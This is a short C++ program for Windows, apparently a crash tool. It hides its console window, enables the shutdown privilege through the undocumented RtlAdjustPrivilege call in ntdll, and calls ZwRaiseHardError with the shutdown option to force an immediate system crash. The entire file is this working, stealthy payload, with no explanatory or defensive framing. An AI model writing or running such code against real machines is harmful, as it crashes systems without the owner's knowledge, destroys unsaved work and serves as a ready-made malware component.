#include "RaiseHardError.h"

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    auto hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll == nullptr) {
        FreeLibrary(hNtdll);
        return ERROR_BAD_ENVIRONMENT;
    }

    auto RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege) GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    BOOLEAN enabled;
    if (RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) != 0) {
        FreeLibrary(hNtdll);
        return ERROR_ACCESS_DENIED;
    }

    auto ZwRaiseHardError = (pdef_ZwRaiseHardError) GetProcAddress(hNtdll, "ZwRaiseHardError");
    FreeLibrary(hNtdll);
    HARDERROR_RESPONSE Response;
    return ZwRaiseHardError(Error_Status, 0, nullptr, nullptr, OptionShutdownSystem, &Response);
}